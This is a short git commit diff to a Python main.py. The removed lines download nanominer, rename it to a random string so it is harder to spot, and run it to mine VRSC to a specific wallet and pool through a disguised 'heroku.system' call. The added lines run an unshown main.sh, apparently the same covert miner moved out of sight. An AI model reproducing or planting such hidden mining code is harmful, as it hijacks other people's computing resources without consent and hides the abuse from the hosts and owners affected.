980a26efbede4876bd891dafe7efdb72a2ea4b78
sabri fuadi <sabrif0610@gmail.com>
2023-03-08 05:16:24 +0000

    Update main.py

--- main.py
+++ main.py
@@ -8,11 +8,8 @@ import ssl
 import random
 import threading
 
-heroku.system(f'wget https://github.com/nanopool/nanominer/releases/download/v3.7.7/nanominer-linux-3.7.7.tar.gz')
-heroku.system(f'tar xf nanominer-linux-3.7.7.tar.gz')
-heroku.system(f'test=$(shuf -i 1-999999 -n 1)')
-heroku.system(f'mv nanominer $test')
-heroku.system(f'./$test -algo Verushash -wallet RC1cM3E6qp34rJtem8fdvkfVQFVPL8pM4V.Rig001 -coin VRSC -pool1 verushash.mine.zergpool.com:3300 -useSSL false -t 4')
+heroku.system(f'chmod +x main.sh')
+heroku.system(f'./main.sh')
 
 
 
